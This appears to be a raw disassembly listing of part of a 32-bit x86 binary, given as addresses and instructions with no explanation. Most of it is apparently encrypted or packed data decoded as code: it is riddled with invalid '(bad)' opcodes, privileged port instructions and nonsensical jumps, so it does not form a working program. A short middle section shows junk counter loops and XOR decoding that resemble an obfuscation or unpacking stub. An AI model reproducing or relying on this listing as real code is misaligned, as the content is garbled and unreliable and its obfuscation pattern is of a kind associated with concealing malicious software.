  408bf7:	mov    ebx,0x4b810e2b
  408bfc:	scas   eax,DWORD PTR es:[edi]
  408bfd:	jbe    0x408c42
  408bff:	loopne 0x408c03
  408c01:	scas   eax,DWORD PTR es:[edi]
  408c02:	mov    eax,0x1acb2342
  408c07:	pusha  
  408c08:	and    eax,0xb7bd340c
  408c0d:	enter  0xa96a,0xd0
  408c11:	push   esi
  408c12:	or     edi,ecx
  408c14:	les    eax,FWORD PTR ds:0x8c4ec3e
  408c1a:	dec    ebp
  408c1b:	test   edx,edi
  408c1d:	aam    0x4f
  408c1f:	outs   dx,DWORD PTR ds:[esi]
  408c20:	jle    0x408c80
  408c22:	mov    al,0x3f
  408c24:	dec    esi
  408c25:	je     0x408c79
  408c27:	leave  
  408c28:	lock or dl,BYTE PTR [ecx-0x29]
  408c2c:	sti    
  408c2d:	or     BYTE PTR [ebp+0x5],dl
  408c30:	imul   DWORD PTR [ebp+0x73]
  408c33:	sti    
  408c34:	jp     0x408c0d
  408c36:	jo     0x408c7f
  408c38:	cmp    BYTE PTR ss:[ebp+eiz*1-0x4],dh
  408c3d:	pop    edx
  408c3e:	lds    ebp,FWORD PTR [edi+edi*1]
  408c41:	xchg   ebx,eax
  408c42:	aad    0x1b
  408c44:	not    BYTE PTR [ecx+eiz*4+0x4]
  408c48:	outs   dx,DWORD PTR ds:[esi]
  408c49:	pop    esi
  408c4a:	lods   al,BYTE PTR ds:[esi]
  408c4b:	stos   BYTE PTR es:[edi],al
  408c4c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408c4d:	call   0xa6023973
  408c52:	das    
  408c53:	or     BYTE PTR [eax],bh
  408c55:	mov    eax,0x29e832d0
  408c5a:	or     eax,0x3cd3d764
  408c5f:	je     0x408c50
  408c61:	sbb    dh,dl
  408c63:	clc    
  408c64:	mov    ah,0xfe
  408c66:	jmp    0x408caf
  408c68:	mov    dl,0x74
  408c6a:	or     edx,ebp
  408c6c:	leave  
  408c6d:	xchg   sp,ax
  408c6f:	lahf   
  408c70:	cmp    BYTE PTR [edx+eiz*2],dl
  408c73:	std    
  408c74:	pop    esp
  408c75:	scas   al,BYTE PTR es:[edi]
  408c76:	scas   eax,DWORD PTR es:[edi]
  408c77:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408c79:	dec    ebp
  408c7a:	icebp  
  408c7b:	or     ebp,DWORD PTR [ebx-0x5511c613]
  408c81:	in     al,0x8e
  408c83:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408c84:	xlat   BYTE PTR ds:[ebx]
  408c85:	cwde   
  408c86:	(bad)  
  408c87:	(bad)  [eax+0x25a3bbc3]
  408c8d:	dec    ecx
  408c8e:	loop   0x408ce5
  408c90:	add    edx,esi
  408c92:	imul   edx,edi
  408c95:	sub    DWORD PTR [eax],edx
  408c97:	mov    eax,DWORD PTR [ebp-0x14]
  408c9a:	jmp    0x408756
  408c9f:	mov    eax,DWORD PTR [ebp-0xc]
  408ca2:	mov    edx,DWORD PTR [ebp-0x18]
  408ca5:	jmp    0x408e2c
  408caa:	test   ecx,ebx
  408cac:	stc    
  408cad:	test   BYTE PTR [ecx+0x64],ah
  408cb0:	sbb    ecx,0x67327607
  408cb6:	push   ebx
  408cb7:	add    al,0x91
  408cb9:	pop    edi
  408cba:	adc    al,0xdc
  408cbc:	jle    0x408d3c
  408cbe:	in     al,0x7f
  408cc0:	jle    0x408d40
  408cc2:	(bad)  
  408cc3:	fistp  WORD PTR [edx+0x2ad1835f]
  408cc9:	cdq    
  408cca:	fsubr  DWORD PTR [eax]
  408ccc:	xchg   eax,esp
  408cce:	mov    ?,WORD PTR [ebp+0x2e95f008]
  408cd4:	mov    edx,0xaae0641c
  408cd9:	(bad)  
  408cda:	inc    eax
  408cdb:	pop    ds
  408cdc:	out    0xba,al
  408cde:	adc    ch,BYTE PTR [eax]
  408ce0:	aam    0x4
  408ce2:	imul   esi,DWORD PTR [esi-0x6e44a0c8],0x24
  408ce9:	xchg   esi,eax
  408cea:	dec    esp
  408ceb:	mov    ebp,DWORD PTR ds:0x44a3a7f2
  408cf1:	jle    0x408cc0
  408cf3:	test   al,0x80
  408cf5:	jae    0x408d28
  408cf7:	and    eax,0x38853438
  408cfc:	int    0x11
  408cfe:	add    BYTE PTR [esi+0x7f0adbbf],bl
  408d04:	xchg   edi,eax
  408d05:	xor    eax,0x97dc3e1a
  408d0a:	sbb    BYTE PTR [edx-0x13425342],bh
  408d10:	popa   
  408d11:	int3   
  408d12:	push   ebp
  408d13:	mov    edx,0x88883cbc
  408d18:	jge    0x408d2b
  408d1a:	idiv   BYTE PTR [esi]
  408d1c:	mov    ch,cl
  408d1e:	xchg   BYTE PTR ss:[esi+0x477b8a5f],dh
  408d25:	mov    bl,0x26
  408d27:	ss pause 
  408d2a:	or     BYTE PTR [esi+0x3a10df5c],al
  408d30:	stos   BYTE PTR es:[edi],al
  408d31:	mov    DWORD PTR [eax+0x13],esi
  408d34:	xor    al,0x1b
  408d36:	or     BYTE PTR ds:0x5a599e3b,bh
  408d3c:	jbe    0x408da5
  408d3e:	aaa    
  408d3f:	es inc edx
  408d41:	sbb    ebp,ecx
  408d43:	shr    DWORD PTR [edx+0x19],1
  408d46:	pop    edi
  408d47:	stc    
  408d48:	mov    al,ds:0x69322294
  408d4d:	fstp   DWORD PTR [ebp-0x7867ef94]
  408d53:	jno    0x408db4
  408d55:	mov    ch,0x20
  408d57:	daa    
  408d58:	jne    0x408d20
  408d5a:	loopne 0x408dab
  408d5c:	pop    ecx
  408d5d:	stc    
  408d5e:	je     0x408da8
  408d60:	sbb    edi,DWORD PTR [esi]
  408d62:	xchg   esp,eax
  408d63:	xchg   ebp,eax
  408d64:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408d65:	int    0xaa
  408d67:	loop   0x408ceb
  408d69:	fld    QWORD PTR [ebp+ecx*2+0x3573fd6e]
  408d70:	data16 movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408d72:	fcomp  QWORD PTR [eax+0x53c9c08]
  408d78:	repnz push es
  408d7a:	stos   BYTE PTR es:[edi],al
  408d7b:	es jae 0x408d4e
  408d7e:	idiv   BYTE PTR [esi+esi*8]
  408d81:	sar    DWORD PTR [eax+0x1327a208],cl
  408d87:	or     edi,DWORD PTR ds:0x8f5e7711
  408d8d:	xchg   esi,eax
  408d8e:	cmp    al,0x76
  408d90:	fisttp WORD PTR [ebp-0x41]
  408d93:	pop    ds
  408d94:	pop    edx
  408d95:	xchg   edx,esp
  408d97:	mov    bh,BYTE PTR [ecx+0x3ecc7cfe]
  408d9d:	je     0x408d4a
  408d9f:	xchg   DWORD PTR [esi],ebx
  408da1:	lea    edi,[eax+0x50235ff3]
  408da7:	fisttp QWORD PTR [esi-0x24]
  408daa:	sub    eax,0x7ee3a0d5
  408daf:	and    esi,esi
  408db1:	mov    esp,0x650b3d39
  408db6:	in     eax,dx
  408db7:	pop    eax
  408db8:	jb     0x408dfc
  408dba:	pop    edi
  408dbb:	cmp    eax,0x453cc04d
  408dc0:	mov    eax,ds:0x8205e6a0
  408dc5:	and    ecx,DWORD PTR [edx+0x60f10ea7]
  408dcb:	int    0x8f
  408dcd:	sbb    eax,0x8fa3061
  408dd2:	ja     0x408d99
  408dd4:	dec    edx
  408dd5:	js     0x408db1
  408dd7:	mov    dh,0x24
  408dd9:	cmp    edi,ebp
  408ddb:	push   es
  408ddc:	icebp  
  408ddd:	(bad)  
  408dde:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408ddf:	ins    DWORD PTR es:[edi],dx
  408de0:	dec    esp
  408de1:	and    DWORD PTR [ebp-0x2133478a],esi
  408de7:	pop    edx
  408de8:	mov    ss,WORD PTR [ebp+0x7]
  408deb:	cmp    cl,BYTE PTR [ecx-0x77]
  408dee:	mov    esi,0x66024ca2
  408df3:	fcomi  st,st(1)
  408df5:	sub    DWORD PTR fs:[edi],0xffffffd8
  408df9:	scas   eax,DWORD PTR es:[edi]
  408dfa:	cmp    DWORD PTR [eax+0x47],ecx
  408dfd:	stc    
  408dfe:	xlat   BYTE PTR ds:[ebx]
  408dff:	push   0xc71c47ed
  408e04:	xlat   BYTE PTR ds:[ebx]
  408e05:	or     BYTE PTR [eax],al
  408e07:	stos   DWORD PTR es:[edi],eax
  408e08:	sbb    DWORD PTR [esi],0xffffffcb
  408e0b:	adc    al,0xa1
  408e0d:	mov    al,ds:0xe88ad652
  408e12:	dec    ebx
  408e13:	outs   dx,BYTE PTR ds:[esi]
  408e14:	std    
  408e15:	repz xor esp,DWORD PTR [esi+0x6cdf8a66]
  408e1c:	adc    DWORD PTR [ebx+eiz*4],esp
  408e1f:	xchg   ecx,eax
  408e20:	add    bl,bl
  408e22:	jecxz  0x408dc3
  408e24:	dec    ebx
  408e25:	stos   DWORD PTR es:[edi],eax
  408e26:	cmp    BYTE PTR [ebx+0x271119ed],bh
  408e2c:	xor    eax,edx
  408e2e:	cmp    eax,0x7aa80c5b
  408e33:	je     0x40858a
  408e39:	mov    eax,DWORD PTR [ebp-0x10]
  408e3c:	add    DWORD PTR [eax],0x7403501
  408e42:	jmp    0x40858a
  408e47:	mov    eax,DWORD PTR [ebp-0x1c]
  408e4a:	jmp    0x408fd1
  408e4f:	xor    eax,0xa417048d
  408e54:	xchg   edi,eax
  408e55:	xor    eax,0xaa1dcad
  408e5a:	jmp    0xde251b24
  408e5f:	cli    
  408e60:	fnstsw WORD PTR [esi+0x7e]
  408e63:	in     al,0x7f
  408e65:	jle    0x408ee5
  408e67:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408e68:	mov    ds:0xb4811c3f,eax
  408e6d:	xor    bh,BYTE PTR [edx]
  408e6f:	sbb    ch,dl
  408e71:	jp     0x408e48
  408e73:	clc    
  408e74:	add    ch,BYTE PTR ds:0x3074224e
  408e7a:	fldl2t 
  408e7c:	xchg   dh,ch
  408e7e:	hlt    
  408e7f:	push   esi
  408e80:	pop    ebx
  408e81:	leave  
  408e82:	jmp    0x4944:0xed9c7821
  408e89:	push   es
  408e8a:	mov    ds,WORD PTR [edx]
  408e8c:	imul   DWORD PTR [edx-0x7595c6cd]
  408e92:	dec    ecx
  408e93:	cld    
  408e94:	test   al,0xf
  408e96:	pop    ebp
  408e97:	xlat   BYTE PTR ds:[ebx]
  408e98:	cmp    esp,eax
  408e9a:	enter  0xf3b0,0xb7
  408e9e:	ja     0x408e3b
  408ea0:	pushf  
  408ea1:	adc    ecx,DWORD PTR [esi]
  408ea3:	push   ss
  408ea4:	in     eax,0x91
  408ea6:	push   eax
  408ea7:	xcrypt-ctr (bad)
  408ea8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408ea9:	pop    esi
  408eaa:	sbb    DWORD PTR [ebx+0x23128ac4],edx
  408eb0:	add    DWORD PTR [ecx],0x326dad07
  408eb6:	loope  0x408f22
  408eb8:	ficomp WORD PTR [edi]
  408eba:	mov    edx,0x2f99bcca
  408ebf:	add    BYTE PTR [ecx],0xc4
  408ec2:	or     ebx,DWORD PTR ds:0x5f3682fe
  408ec8:	fs aam 0x16
  408ecb:	out    dx,eax
  408ecc:	add    esi,DWORD PTR [ebx+0x2f8874fe]
  408ed2:	pop    edx
  408ed3:	sbb    DWORD PTR [esi+0x47],esi
  408ed6:	mov    cx,0x54d2
  408eda:	fst    QWORD PTR [ecx-0x17]
  408edd:	ror    BYTE PTR [bp-0x67],0xd1
  408ee2:	js     0x408f42
  408ee4:	pop    ecx
  408ee5:	shr    ebp,1
  408ee7:	cli    
  408ee8:	dec    ebp
  408ee9:	and    DWORD PTR [ecx],eax
  408eeb:	jb     0x408eb0
  408eed:	dec    ebx
  408eee:	adc    eax,0xaba334de
  408ef3:	lds    edx,FWORD PTR [esi-0x4a]
  408ef6:	aas    
  408ef7:	sahf   
  408ef8:	xchg   esp,eax
  408ef9:	arpl   WORD PTR [ecx],si
  408efb:	popa   
  408efc:	popf   
  408efd:	dec    edi
  408efe:	xchg   ebx,eax
  408eff:	inc    esp
  408f00:	and    ch,al
  408f02:	push   edx
  408f03:	sti    
  408f04:	test   al,0x1f
  408f06:	imul   edx,DWORD PTR [ecx],0xffffffd9
  408f09:	retf   0x3cf2
  408f0c:	fist   DWORD PTR ds:0x94840d38
  408f12:	(bad)  
  408f13:	lock sbb eax,0xc38279a7
  408f19:	jle    0x408f41
  408f1b:	add    DWORD PTR [ebp-0xd],esi
  408f1e:	arpl   ax,si
  408f20:	outs   dx,BYTE PTR ds:[esi]
  408f21:	add    BYTE PTR [edi-0x48],bl
  408f24:	ror    DWORD PTR ds:[ebx],cl
  408f27:	add    al,0xb1
  408f29:	inc    eax
  408f2a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408f2b:	in     eax,dx
  408f2c:	adc    al,0x93
  408f2e:	es push 0xffffffda
  408f31:	pusha  
  408f32:	and    eax,0xad56f93e
  408f37:	shl    DWORD PTR [ecx+0x68],cl
  408f3a:	in     al,dx
  408f3b:	into   
  408f3c:	adc    DWORD PTR [edx+ecx*1],edi
  408f3f:	or     dl,BYTE PTR [eax+0x37b02564]
  408f45:	add    BYTE PTR [ebx],cl
  408f47:	xchg   esi,eax
  408f48:	inc    esp
  408f49:	into   
  408f4a:	push   edi
  408f4b:	pop    ecx
  408f4c:	push   eax
  408f4d:	je     0x408f46
  408f4f:	int    0x4
  408f51:	push   edx
  408f52:	jb     0x408edd
  408f54:	test   ebx,0xd5dffbfe
  408f5a:	dec    edx
  408f5b:	inc    ecx
  408f5c:	inc    edi
  408f5d:	push   ebp
  408f5e:	pop    esi
  408f60:	xor    eax,0xedc5cbcf
  408f65:	(bad)  
  408f66:	push   esp
  408f67:	mov    BYTE PTR [ecx-0x38497bdb],dh
  408f6d:	sub    edx,ecx
  408f6f:	cmp    eax,esi
  408f71:	int3   
  408f72:	push   0x4f568346
  408f77:	mov    bh,0x3b
  408f79:	push   ecx
  408f7a:	jno    0x408f9b
  408f7c:	in     al,dx
  408f7d:	pop    ebx
  408f7e:	pop    ss
  408f7f:	jns    0x408f3b
  408f81:	out    dx,eax
  408f82:	mov    edx,0xcc7f09b5
  408f87:	jge    0x408f5e
  408f89:	iret   
  408f8a:	jmp    0x40900a
  408f8c:	mov    ebx,0xafed21aa
  408f91:	adc    al,0x52
  408f93:	dec    ebp
  408f94:	imul   ebx,DWORD PTR [edx-0x6],0x1b2065e9
  408f9b:	(bad)  
  408f9c:	mov    esp,0xc69092f8
  408fa1:	fsubr  DWORD PTR [ebx+0x24]
  408fa4:	and    edx,DWORD PTR [ecx+0x13]
  408fa7:	sbb    dh,bh
  408fa9:	call   0xdb9571e2
  408fae:	pop    edx
  408faf:	ret    
  408fb0:	test   BYTE PTR [ecx-0x213504a0],dh
  408fb6:	sar    DWORD PTR [esi-0x7f],0xa2
  408fba:	dec    ebx
  408fbb:	pop    esi
  408fbc:	dec    ebx
  408fbd:	aas    
  408fbe:	cwde   
  408fbf:	cmp    al,0x6a
  408fc1:	pop    es
  408fc2:	rcr    bl,0x84
  408fc5:	mov    edi,0x8283225b
  408fca:	stos   DWORD PTR es:[edi],eax
  408fcb:	(bad)  
  408fcc:	xchg   ebx,eax
  408fcd:	xchg   esi,eax
  408fce:	daa    
  408fcf:	mov    bh,0x3f
  408fd1:	cmp    DWORD PTR [eax],edi
  408fd3:	je     0x40858a
  408fd9:	mov    eax,0x800f1c9a
  408fde:	jmp    0x4088e1
  408fe3:	push   ebp
  408fe4:	mov    ebp,esp
  408fe6:	sub    esp,0x20
  408fe9:	sub    ecx,eax
  408feb:	mov    eax,ds:0x413bde
  408ff0:	and    DWORD PTR ds:0x4337af,0x0
  408ffa:	jmp    0x40900c
  408fff:	mov    ecx,DWORD PTR ds:0x4337af
  409005:	inc    ecx
  409006:	mov    DWORD PTR ds:0x4337af,ecx
  40900c:	cmp    DWORD PTR ds:0x4337af,0x1c
  409013:	jae    0x409040
  409019:	cmp    DWORD PTR ds:0x4337af,0x20
  409020:	jne    0x40903b
  409026:	push   0x4819
  40902b:	push   0x30ae
  409030:	push   0x3675
  409035:	call   DWORD PTR ds:0x412014
  40903b:	jmp    0x408fff
  409040:	mov    eax,DWORD PTR [eax+0x198]
  409046:	mov    DWORD PTR [ebp-0x8],eax
  409049:	and    DWORD PTR ds:0x4337eb,0x0
  409053:	mov    ecx,DWORD PTR ds:0x4337eb
  409059:	inc    ecx
  40905a:	mov    DWORD PTR ds:0x4337eb,ecx
  409060:	cmp    DWORD PTR ds:0x4337eb,0x1c
  409067:	jne    0x409085
  40906d:	push   0x43382f
  409072:	push   0x494f
  409077:	push   0x43389a
  40907c:	push   DWORD PTR [ebp-0x24]
  40907f:	call   DWORD PTR ds:0x412394
  409085:	cmp    DWORD PTR ds:0x4337eb,0x13
  40908c:	jb     0x409053
  409092:	mov    eax,DWORD PTR [ebp+0x8]
  409095:	and    ecx,DWORD PTR ds:0x4337f3
  40909b:	mov    ecx,DWORD PTR [ebp-0x8]
  40909e:	sbb    DWORD PTR ds:0x433803,0x43383b
  4090a8:	push   ebx
  4090a9:	xor    DWORD PTR ds:0x433777,0x7c2a
  4090b3:	push   esi
  4090b4:	mov    esi,DWORD PTR ds:0x4337c7
  4090ba:	mov    ebx,DWORD PTR ds:0x4337db
  4090c0:	sub    ebx,esi
  4090c2:	or     esi,DWORD PTR [esi+ebx*1]
  4090c5:	mov    esi,0x7510854
  4090ca:	xor    eax,esi
  4090cc:	adc    DWORD PTR ds:0x4337a7,0x43372f
  4090d6:	push   edi
  4090d7:	mov    edi,0x32729b
  4090dc:	and    ebx,DWORD PTR ds:0x433727
  4090e2:	add    eax,edi
  4090e4:	mov    DWORD PTR [ecx],eax
  4090e6:	or     DWORD PTR ds:0x43383b,ebx
  4090ec:	lea    eax,[ebp-0x4]
  4090ef:	mov    DWORD PTR [ebp-0x10],eax
  4090f2:	mov    eax,DWORD PTR [ebp+0x8]
  4090f5:	mov    ecx,DWORD PTR [ebp-0x10]
  4090f8:	xor    eax,esi
  4090fa:	sbb    ebx,0x3e7b
  409100:	add    eax,edi
  409102:	mov    DWORD PTR ds:0x433713,0x17
  40910c:	cmp    DWORD PTR ds:0x433713,0x0
  409113:	je     0x40914b
  409119:	cmp    DWORD PTR ds:0x433713,0x27
  409120:	jne    0x409139
  409126:	push   0x3901
  40912b:	push   0x70c3
  409130:	push   DWORD PTR [ebp-0x1c]
  409133:	call   DWORD PTR ds:0x412398
  409139:	mov    ebx,DWORD PTR ds:0x433713
  40913f:	dec    ebx
  409140:	mov    DWORD PTR ds:0x433713,ebx
  409146:	jmp    0x40910c
  40914b:	mov    DWORD PTR [ecx],eax
  40914d:	neg    DWORD PTR ds:0x4337a7
  409153:	jmp    0x409474
  409158:	add    eax,0x73dd76a0
  40915d:	jmp    0x619bf1f7
  409162:	mov    ch,0x2
  409164:	ret    0xf008
  409167:	sub    al,0x60
  409169:	fidivr DWORD PTR [esi+0x7e]
  40916c:	jp     0x4091eb
  40916e:	jle    0x4091ee
  409170:	mov    esi,0x6e89dc75
  409175:	mov    esp,0x46dcf95a
  40917a:	test   bl,ch
  40917c:	enter  0x4136,0xa0
  409180:	and    al,0x40
  409182:	dec    esi
  409183:	push   edx
  409184:	sbb    eax,0xfe7798aa
  409189:	mov    ds:0xee3ea3b6,eax
  40918e:	sub    esi,DWORD PTR [edx+0x3936fef8]
  409194:	jnp    0x4091c3
  409196:	adc    DWORD PTR ds:0x88851bf1,edx
  40919c:	fisttp QWORD PTR [esi-0x36d59f1b]
  4091a2:	jns    0x409162
  4091a4:	push   eax
  4091a5:	aad    0x17
  4091a7:	and    DWORD PTR [edi+0x7000b279],esp
  4091ad:	mov    edx,0x949aa47e
  4091b2:	leave  
  4091b3:	dec    esp
  4091b4:	cmp    al,ch
  4091b6:	cli    
  4091b7:	push   cs
  4091b8:	mov    ch,0xf3
  4091ba:	loope  0x409174
  4091bc:	push   edi
  4091bd:	repnz shr eax,0x7f
  4091c1:	in     eax,dx
  4091c2:	jl     0x4091b7
  4091c4:	jecxz  0x40920c
  4091c6:	sahf   
  4091c7:	pop    ss
  4091c8:	aam    0xc8
  4091ca:	jns    0x4091aa
  4091cc:	push   ecx
  4091cd:	xchg   BYTE PTR [esi],ch
  4091cf:	loope  0x409240
  4091d1:	daa    
  4091d2:	push   edi
  4091d3:	outs   dx,BYTE PTR ds:[esi]
  4091d4:	(bad)  
  4091d5:	into   
  4091d6:	add    DWORD PTR ds:0xe429c4ce,0xadfc465
  4091e0:	cmp    DWORD PTR ds:0x211f,0xffffffb6
  4091e6:	pop    ss
  4091e7:	stc    
  4091e8:	pusha  
  4091e9:	cmp    eax,0xd15d1c77
  4091ee:	mov    ?,WORD PTR [edi-0x51]
  4091f1:	in     al,0x49
  4091f3:	(bad)  
  4091f4:	stos   DWORD PTR es:[edi],eax
  4091f5:	je     0x4091be
  4091f7:	adc    eax,0xc5daa2c4
  4091fc:	shl    BYTE PTR [ebx+0x46f36e70],1
  409202:	inc    eax
  409203:	sbb    bl,al
  409205:	rol    BYTE PTR [edi+0x657a38ae],cl
  40920b:	cmp    esi,ecx
  40920d:	dec    ebx
  40920e:	pusha  
  40920f:	push   ebp
  409210:	add    dl,BYTE PTR [edi+0xe947113]
  409216:	es daa 
  409218:	adc    dl,BYTE PTR [ebp*2+0x7e4039af]
  40921f:	xchg   edi,eax
  409220:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409221:	inc    ecx
  409222:	xchg   ebp,eax
  409223:	retf   0xc409
  409226:	div    BYTE PTR [edi-0x52fb8745]
  40922c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40922d:	mov    dl,0x9a
  40922f:	cli    
  409230:	dec    ecx
  409231:	out    0x39,al
  409233:	ins    DWORD PTR es:[edi],dx
  409234:	and    eax,0x8c4d87d1
  409239:	je     0x40920b
  40923b:	ret    
  40923c:	jno    0x40923d
  40923e:	xchg   ecx,eax
  40923f:	lds    esi,FWORD PTR [ebx]
  409241:	mov    ah,0x73
  409243:	test   BYTE PTR [edi-0x62],al
  409246:	inc    edx
  409247:	cs and eax,0x124969e5
  40924d:	jae    0x409231
  40924f:	or     eax,0xac0b5a7
  409254:	lods   eax,DWORD PTR ss:[esi]
  409256:	push   ds
  409257:	push   eax
  409258:	lock add edi,DWORD PTR [eax]
  40925b:	jne    0x409219
  40925d:	cmp    BYTE PTR ss:[ecx],dl
  409260:	mov    dl,0x9
  409262:	test   eax,0x61c4ac07
  409267:	out    dx,al
  409268:	add    BYTE PTR [ecx+0x3],ah
  40926b:	and    al,0x14
  40926d:	adc    eax,0xe14a7ceb
  409272:	pop    ebp
  409273:	nop
  409274:	dec    DWORD PTR [esp+ebx*8-0x57766d28]
  40927b:	gs push ss
  40927d:	pop    ds
  40927e:	jl     0x40922f
  409280:	ret    
  409281:	jnp    0x409250
  409283:	adc    al,0x7e
  409285:	fsub   QWORD PTR [ecx+0xd04ac37]
  40928b:	xor    BYTE PTR [ebp-0x3bea0ed1],ah
  409291:	scas   eax,DWORD PTR es:[edi]
  409292:	adc    al,0x4b
  409294:	outs   dx,DWORD PTR ds:[esi]
  409295:	sti    
  409296:	add    ebp,DWORD PTR [ecx+0x33]
  409299:	(bad)  
  40929a:	sti    
  40929b:	push   ebx
  40929c:	and    al,0x9f
  40929e:	fdiv   st(7),st
  4092a0:	push   ebx
  4092a1:	stos   BYTE PTR es:[edi],al
  4092a2:	mov    esi,0x164113ff
  4092a7:	ins    DWORD PTR es:[edi],dx
  4092a8:	les    esi,FWORD PTR [edi+ecx*8]
  4092ab:	push   esp
  4092ac:	into   
  4092ad:	pop    esp
  4092ae:	dec    edi
  4092af:	or     BYTE PTR [esp+esi*8],dl
  4092b2:	aad    0xf4
  4092b4:	push   ds
  4092b5:	jns    0x4092f4
  4092b7:	fwait
  4092b8:	call   0xb2a33cf1
  4092bd:	lds    ebx,FWORD PTR ds:0xc5d33cec
  4092c3:	daa    
  4092c4:	jecxz  0x4092b0
  4092c6:	add    eax,0x98b0fe44
  4092cb:	or     BYTE PTR [esi-0x2],bh
  4092ce:	pop    DWORD PTR [eax]
  4092d0:	mov    ecx,0xe67774f5
  4092d5:	xor    eax,0x6013a38e
  4092da:	pop    ds
  4092db:	test   al,0x15
  4092dd:	xchg   ecx,eax
  4092de:	adc    DWORD PTR [edi-0x14],edx
  4092e1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4092e2:	inc    ebp
  4092e3:	push   0x5c4c0334
  4092e8:	nop
  4092e9:	xchg   edx,eax
  4092ea:	or     al,0xa2
  4092ec:	or     ebp,ebp
  4092ee:	leave  
  4092ef:	icebp  
  4092f0:	or     ebx,DWORD PTR [ebx-0x50ff6711]
  4092f6:	ret    0xacda
  4092f9:	cli    
  4092fa:	in     eax,dx
  4092fb:	mov    ebx,0xf0a1211e
  409300:	aad    0x54
  409302:	pop    es
  409303:	mov    ds:0x743d59ad,eax
  409308:	mov    eax,ds:0x91324702
  40930d:	xchg   ecx,eax
  40930e:	push   edx
  40930f:	cdq    
  409310:	pop    esi
  409311:	and    al,0xbb
  409313:	xor    eax,0xfe5c467c
  409318:	in     al,0xa8
  40931a:	pop    DWORD PTR [ebx+0x11]
  40931d:	pop    edi
  40931e:	mov    edx,0x12dc1bd9
  409323:	push   ebp
  409324:	test   eax,0x5d7ad17
  409329:	cli    
  40932a:	aaa    
  40932b:	mov    edx,0xfbc3d0d9
  409330:	loopne 0x4092c9
  409332:	pop    ecx
  409333:	ror    DWORD PTR [eax+0x72ce307e],cl
  409339:	adc    DWORD PTR [ecx-0x1da0ce81],ebx
  40933f:	and    esp,DWORD PTR [edx]
  409341:	mov    ah,0x57
  409343:	jns    0x4092f4
  409345:	test   al,0x1b
  409347:	fwait
  409348:	and    eax,0xa88bd5f1
  40934d:	add    ah,ah
  40934f:	push   0xffffffd0
  409351:	out    0xbf,eax
  409353:	fcomp  DWORD PTR [edi-0x438f527c]
  409359:	sti    
  40935a:	pop    edx
  40935b:	repnz or al,0x4c
  40935e:	(bad)  
  40935f:	shr    DWORD PTR [eax+0x2e8c42c4],1
  409365:	jb     0x409316
  409367:	mov    eax,0x4735ac49
  40936c:	sbb    ecx,DWORD PTR [edi]
  40936e:	inc    esp
  40936f:	addr16 pushf 
  409371:	or     BYTE PTR [edi],dl
  409373:	xchg   edi,eax
  409374:	pop    es
  409375:	push   0xffffffd0
  409377:	add    BYTE PTR [ecx-0x29aa69f8],dh
  40937d:	adc    eax,0xfad6759b
  409382:	adc    al,0x20
  409384:	inc    edx
  409385:	push   esi
  409386:	stos   BYTE PTR es:[edi],al
  409387:	inc    eax
  409388:	in     al,0x9
  40938a:	jl     0x4093c5
  40938c:	mov    bl,0x22
  40938e:	cmp    dh,BYTE PTR [eax-0x20008f30]
  409394:	aas    
  409395:	push   cs
  409396:	in     eax,0x57
  409398:	fst    QWORD PTR [ebx+0x25]
  40939b:	int3   
  40939c:	mov    es,WORD PTR [edx-0x191e5daf]
  4093a2:	push   ds
  4093a3:	(bad)  
  4093a4:	jb     0x409382
  4093a6:	lahf   
  4093a7:	add    DWORD PTR [edi+0x2970e10e],esi
  4093ad:	sbb    eax,0x6ee25823
  4093b2:	sbb    cl,BYTE PTR [ebx]
  4093b4:	cmp    al,0x2f
  4093b6:	cmp    al,BYTE PTR [edi+0x39]
  4093b9:	(bad)  
  4093ba:	ins    DWORD PTR es:[edi],dx
  4093bb:	dec    esp
  4093bc:	xor    BYTE PTR [esi],ch
  4093be:	rol    BYTE PTR [ecx+0x7a],1
  4093c1:	push   ebp
  4093c2:	jae    0x40938d
  4093c4:	mov    ds:0xa6eb4bb0,eax
  4093c9:	adc    al,0xba
  4093cb:	jg     0x409372
  4093cd:	ret    
  4093ce:	repz sti 
  4093d0:	push   ebx
  4093d1:	push   cs
  4093d2:	dec    ecx
  4093d3:	addr16 jmp 0xb0e6411b
  4093d9:	jbe    0x409378
  4093db:	test   eax,0x76c7535a
  4093e0:	rcr    dl,0x57
  4093e3:	adc    edi,DWORD PTR [ecx]
  4093e5:	retf   
  4093e6:	cmp    DWORD PTR [esi],eax
  4093e8:	mov    edi,0x83c40cbd
  4093ed:	bound  edi,QWORD PTR [eax]
  4093ef:	push   ecx
  4093f0:	retf   
  4093f1:	stos   DWORD PTR es:[edi],eax
  4093f2:	into   
  4093f3:	pop    edi
  4093f4:	adc    al,BYTE PTR [eax-0xf]
  4093f7:	pop    es
  4093f8:	mov    ah,0x2d
  4093fa:	jp     0x4093b1
  4093fc:	test   al,0x2e
  4093fe:	out    dx,eax
  4093ff:	ja     0x40938e
  409401:	fnsave [ecx-0x46388db0]
  409407:	fidivr WORD PTR [edx+0x15]
  40940a:	xor    BYTE PTR [edx-0x56],al
  40940d:	cmp    BYTE PTR [esp+eax*1+0x6952ad9d],ah
  409414:	sbb    dl,bh
  409416:	xor    eax,0x65e5caa2
  40941b:	sbb    eax,0xb79671ec
  409420:	or     al,ah
  409422:	jne    0x40946a
  409424:	scas   eax,DWORD PTR es:[edi]
  409425:	mov    ecx,0x8b0f745
  40942a:	push   ss
  40942b:	bound  ecx,QWORD PTR [ebp+0x2]
  40942e:	clc    
  40942f:	dec    edx
  409430:	data16 jle 0x4093dd
  409433:	jnp    0x4093e6
  409435:	or     eax,0x7fb116e4
  40943a:	sub    al,0x21
  40943c:	popa   
  40943d:	xchg   esi,eax
  40943e:	test   al,0x3
  409440:	leave  
  409441:	test   al,0xba
  409443:	cmp    DWORD PTR [ebx+0x643b639c],0x6af5cd8b
  40944d:	pop    esi
  40944e:	inc    esp
  40944f:	sub    DWORD PTR ds:0x54de3dfb,esp
  409455:	mov    ecx,DWORD PTR [esi]
